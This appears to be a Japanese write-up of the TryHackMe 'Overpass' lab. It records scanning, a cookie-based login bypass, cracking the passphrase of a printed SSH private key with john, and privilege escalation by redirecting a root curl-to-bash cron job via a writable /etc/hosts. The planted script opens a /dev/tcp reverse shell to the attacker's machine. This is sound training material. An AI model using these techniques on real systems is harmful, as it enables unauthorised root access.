# Overpass CTF

https://tryhackme.com/room/overpass

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.49.80
root@ip-10-10-146-96:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-23 07:27 GMT
Nmap scan report for 10.10.49.80
Host is up (0.00040s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:2F:11:F1:5E:3F (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 3.76 seconds
root@ip-10-10-146-96:~# sudo nmap -sV -p22,80 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-23 07:27 GMT
Nmap scan report for 10.10.49.80
Host is up (0.00014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
MAC Address: 02:2F:11:F1:5E:3F (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### gobuster

```shell
root@ip-10-10-146-96:~# gobuster dir -x=txt,php -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.49.80
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 0] [--> img/]
/downloads            (Status: 301) [Size: 0] [--> downloads/]
/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
/admin                (Status: 301) [Size: 42] [--> /admin/]
/css                  (Status: 301) [Size: 0] [--> css/]
/http%3A%2F%2Fwww     (Status: 301) [Size: 0] [--> /http:/www]
/http%3A%2F%2Fwww.txt (Status: 301) [Size: 0] [--> /http:/www.txt]
/http%3A%2F%2Fwww.php (Status: 301) [Size: 0] [--> /http:/www.php]
/http%3A%2F%2Fyoutube.php (Status: 301) [Size: 0] [--> /http:/youtube.php]
/http%3A%2F%2Fyoutube.txt (Status: 301) [Size: 0] [--> /http:/youtube.txt]
/http%3A%2F%2Fyoutube (Status: 301) [Size: 0] [--> /http:/youtube]
/http%3A%2F%2Fblogs   (Status: 301) [Size: 0] [--> /http:/blogs]
/http%3A%2F%2Fblogs.txt (Status: 301) [Size: 0] [--> /http:/blogs.txt]
/http%3A%2F%2Fblogs.php (Status: 301) [Size: 0] [--> /http:/blogs.php]
/http%3A%2F%2Fblog.txt (Status: 301) [Size: 0] [--> /http:/blog.txt]
/http%3A%2F%2Fblog.php (Status: 301) [Size: 0] [--> /http:/blog.php]
/http%3A%2F%2Fblog    (Status: 301) [Size: 0] [--> /http:/blog]
/**http%3A%2F%2Fwww.txt (Status: 301) [Size: 0] [--> /%2A%2Ahttp:/www.txt]
/**http%3A%2F%2Fwww.php (Status: 301) [Size: 0] [--> /%2A%2Ahttp:/www.php]
/**http%3A%2F%2Fwww   (Status: 301) [Size: 0] [--> /%2A%2Ahttp:/www]
/http%3A%2F%2Fcommunity.php (Status: 301) [Size: 0] [--> /http:/community.php]
/http%3A%2F%2Fcommunity.txt (Status: 301) [Size: 0] [--> /http:/community.txt]
/http%3A%2F%2Fcommunity (Status: 301) [Size: 0] [--> /http:/community]
/http%3A%2F%2Fradar.txt (Status: 301) [Size: 0] [--> /http:/radar.txt]
/http%3A%2F%2Fradar   (Status: 301) [Size: 0] [--> /http:/radar]
/http%3A%2F%2Fradar.php (Status: 301) [Size: 0] [--> /http:/radar.php]
/http%3A%2F%2Fjeremiahgrossman.txt (Status: 301) [Size: 0] [--> /http:/jeremiahgrossman.txt]
/http%3A%2F%2Fjeremiahgrossman.php (Status: 301) [Size: 0] [--> /http:/jeremiahgrossman.php]
/http%3A%2F%2Fjeremiahgrossman (Status: 301) [Size: 0] [--> /http:/jeremiahgrossman]
/http%3A%2F%2Fweblog.txt (Status: 301) [Size: 0] [--> /http:/weblog.txt]
/http%3A%2F%2Fweblog.php (Status: 301) [Size: 0] [--> /http:/weblog.php]
/http%3A%2F%2Fweblog  (Status: 301) [Size: 0] [--> /http:/weblog]
/http%3A%2F%2Fswik    (Status: 301) [Size: 0] [--> /http:/swik]
/http%3A%2F%2Fswik.txt (Status: 301) [Size: 0] [--> /http:/swik.txt]
/http%3A%2F%2Fswik.php (Status: 301) [Size: 0] [--> /http:/swik.php]
Progress: 654825 / 654828 (100.00%)
===============================================================
Finished
===============================================================
```

Downloadページにビルド済みのパスワード管理ツールとソースコードがある。  
ソースを見ると、JSONをRote47しているだけなので、ファイルがあれば簡単に解読できる。  
またはローカルに持ってくればツールで普通に閲覧できる。

## /admin

管理者のログイン画面がある。

```text
Our Staff
Ninja - Lead Developer
Pars - Shibe Enthusiast and Emotional Support Animal Manager
Szymex - Head Of Security
Bee - Chief Drinking Water Coordinator
MuirlandOracle - Cryptography Consultant
```

この辺のユーザー名を使うのか、admin等が有効なのか？

ヒントにブルートフォースはないと書かれていた。

```shell
sqlmap -u "http://10.10.49.80/api/login" \
--method POST \
--data "username=admin&password=aaa" \
-p "username"

sqlmap -u "http://10.10.49.80/api/login" \
--method POST \
--data "username=admin&password=aaa" \
-p "password"
```

SQLインジェクションは見つからなかった。

login.js
```js
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

SessionTokenというCookieを作って/adminにアクセスするとログインできる。（値は何でもよい）

```text
Welcome to the Overpass Administrator area
A secure password manager with support for Windows, Linux, MacOS and more

Since you keep forgetting your password, James, I've set up SSH keys for you.

If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
Also, we really need to talk about this "Military Grade" encryption. - Paradox

-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,9F85D92F34F42626F13A7493AB48F337

LNu5wQBBz7pKZ3cc4TWlxIUuD/opJi1DVpPa06pwiHHhe8Zjw3/v+xnmtS3O+qiN
JHnLS8oUVR6Smosw4pqLGcP3AwKvrzDWtw2ycO7mNdNszwLp3uto7ENdTIbzvJal
73/eUN9kYF0ua9rZC6mwoI2iG6sdlNL4ZqsYY7rrvDxeCZJkgzQGzkB9wKgw1ljT
WDyy8qncljugOIf8QrHoo30Gv+dAMfipTSR43FGBZ/Hha4jDykUXP0PvuFyTbVdv
BMXmr3xuKkB6I6k/jLjqWcLrhPWS0qRJ718G/u8cqYX3oJmM0Oo3jgoXYXxewGSZ
AL5bLQFhZJNGoZ+N5nHOll1OBl1tmsUIRwYK7wT/9kvUiL3rhkBURhVIbj2qiHxR
3KwmS4Dm4AOtoPTIAmVyaKmCWopf6le1+wzZ/UprNCAgeGTlZKX/joruW7ZJuAUf
ABbRLLwFVPMgahrBp6vRfNECSxztbFmXPoVwvWRQ98Z+p8MiOoReb7Jfusy6GvZk
VfW2gpmkAr8yDQynUukoWexPeDHWiSlg1kRJKrQP7GCupvW/r/Yc1RmNTfzT5eeR
OkUOTMqmd3Lj07yELyavlBHrz5FJvzPM3rimRwEsl8GH111D4L5rAKVcusdFcg8P
9BQukWbzVZHbaQtAGVGy0FKJv1WhA+pjTLqwU+c15WF7ENb3Dm5qdUoSSlPzRjze
eaPG5O4U9Fq0ZaYPkMlyJCzRVp43De4KKkyO5FQ+xSxce3FW0b63+8REgYirOGcZ
4TBApY+uz34JXe8jElhrKV9xw/7zG2LokKMnljG2YFIApr99nZFVZs1XOFCCkcM8
GFheoT4yFwrXhU1fjQjW/cR0kbhOv7RfV5x7L36x3ZuCfBdlWkt/h2M5nowjcbYn
exxOuOdqdazTjrXOyRNyOtYF9WPLhLRHapBAkXzvNSOERB3TJca8ydbKsyasdCGy
AIPX52bioBlDhg8DmPApR1C1zRYwT1LEFKt7KKAaogbw3G5raSzB54MQpX6WL+wk
6p7/wOX6WMo1MlkF95M3C7dxPFEspLHfpBxf2qys9MqBsd0rLkXoYR6gpbGbAW58
dPm51MekHD+WeP8oTYGI4PVCS/WF+U90Gty0UmgyI9qfxMVIu1BcmJhzh8gdtT0i
n0Lz5pKY+rLxdUaAA9KVwFsdiXnXjHEE1UwnDqqrvgBuvX6Nux+hfgXi9Bsy68qT
8HiUKTEsukcv/IYHK1s+Uw/H5AWtJsFmWQs3bw+Y4iw+YLZomXA4E7yxPXyfWm4K
4FMg3ng0e4/7HRYJSaXLQOKeNwcf/LW5dipO7DmBjVLsC8eyJ8ujeutP/GcA5l6z
ylqilOgj4+yiS813kNTjCJOwKRsXg2jKbnRa8b7dSRz7aDZVLpJnEy9bhn6a7WtS
49TxToi53ZB14+ougkL4svJyYYIRuQjrUmierXAdmbYF9wimhmLfelrMcofOHRW2
+hL1kHlTtJZU8Zj2Y2Y3hd6yRNJcIgCDrmLbn9C5M0d7g0h2BlFaJIZOYDS6J6Yk
2cWk/Mln7+OhAApAvDBKVM7/LGR9/sVPceEos6HTfBXbmsiV+eoFzUtujtymv8U7
-----END RSA PRIVATE KEY-----
```

秘密鍵を使ってSSH接続しようとするとパスワードを要求されて進めない。
```shell
$ ssh james@10.10.110.124 -i id_rsa
```

秘密鍵からパスフレーズをクラック

```shell
$ ssh2john ./id_rsa > ./id_rsa_hash

$ john ./id_rsa_hash                                     
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
Proceeding with incremental:ASCII
james13          (./id_rsa)     
1g 0:00:00:03 DONE 3/3 (2025-02-23 06:19) 0.2710g/s 383072p/s 383072c/s 383072C/s jamest1..jamelli
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

パスフレーズは james13 と判明。

SSH接続できた。

```shell
james@overpass-prod:~$ cat user.txt
thm{65..........}
```

## 権限昇格

```shell
james@overpass-prod:~$ cat todo.txt
To Do:
> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
> Write down my password somewhere on a sticky note so that I don't forget it.
  Wait, we make a password manager. Why don't I just use that?
> Test Overpass for macOS, it builds fine but I'm not sure it actually works
> Ask Paradox how he got the automated build script working and where the builds go.
  They're not updating on the website
```

/home/james/.overpass を kaliにコピーしてパスワード表示。

```shell
$ ./overpassLinux                         
Welcome to Overpass
Options:
1       Retrieve Password For Service
2       Set or Update Password For Service
3       Delete Password For Service
4       Retrieve All Passwords
5       Exit
Choose an option:       4
System   saydrawnlyingpicture
```
これは、Linux の james のパスワードだった。

```shell
james@overpass-prod:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash

james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

ローカルホストの /downloads/src/buildscript.sh をダウンロードして実行している。

buildscript.sh は james から見える範囲にはなかった。

```shell
james@overpass-prod:~$ ls -al /etc/hosts
-rw-rw-rw- 1 root root 250 Jun 27  2020 /etc/hosts
```

hostsを変更できる。

hostsで攻撃PCのIPを設定、ローカルに buildscript.sh を保存

```shell
#!/bin/bash

sh -i >& /dev/tcp/10.2.22.182/8888 0>&1
```

HTTPサーバー起動
```shell
$ sudo python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.110.124 - - [23/Feb/2025 06:59:02] "GET /downloads/src/buildscript.sh HTTP/1.1" 200 -
```

ルートでリバースシェルをとれた。

```shell
$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.110.124] 36940
sh: 0: can't access tty; job control turned off
# whoami
root
# ls /root
buildStatus
builds
go
root.txt
src
# cat /root/root.txt
thm{7f3...................}
```

ルートフラグゲット！

## 振り返り

- SessionToken の値がなんでも認証されるというのは想像が難しかった。
- hosts のパーミッションがガバガバなのはCTFならではという感じ。
